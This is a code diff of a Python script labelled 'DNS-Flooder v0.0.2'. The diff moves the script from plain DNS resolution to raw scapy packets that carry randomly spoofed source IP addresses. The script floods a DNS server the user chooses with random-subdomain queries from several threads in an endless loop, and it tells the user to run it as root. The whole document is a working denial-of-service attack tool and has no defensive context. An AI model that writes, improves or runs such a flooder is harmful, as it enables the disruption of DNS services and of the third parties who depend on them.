@@ -1,27 +1,31 @@
-from dns import resolver as resv
+from scapy.all import *
 from time import sleep
 import random
 import string
 import threading
 
-res = resv.Resolver()
 delay = 1
 threads = 4
 
-def perform_query(dns, domain):
-    res.nameservers = [dns]
-    return res.resolve(domain)
+def perform_query(dns, domain, sourceIP):
+    packet = IP(src=sourceIP, dst=dns) / UDP() / DNS(rd=1, qd=DNSQR(qname=domain))
+    send(packet)
 
 def getRandDomain():
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(6))
 
+def getRandomIP():
+    genIP = f"{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}.{random.randint(1,250)}"
+    return genIP
+
 def flood(): 
     while True:
         global answ
         domainToUse = getRandDomain()
+        ipToUse = getRandomIP()
         try:
-            answ = perform_query(userDNS, f"{domainToUse}.com")
+            answ = perform_query(userDNS, f"{domainToUse}.com", ipToUse)
         except:
             domainToUse = getRandDomain()
         sleep(delay)
@@ -30,6 +34,11 @@ def startThreads():
     for i in range(1,threads):
         t = threading.Thread(target=flood)
         t.start()
+
+print("DNS-Flooder v0.0.2")
+sleep(1)
+print("RUN THIS SCRIPT AS ROOT OR IT WILL NOT WORK!")
+sleep(1)
 
 userDelay = input(f"Delay between requests (def {delay}s): ")
 userDNS = input("DNS Server to use: ")
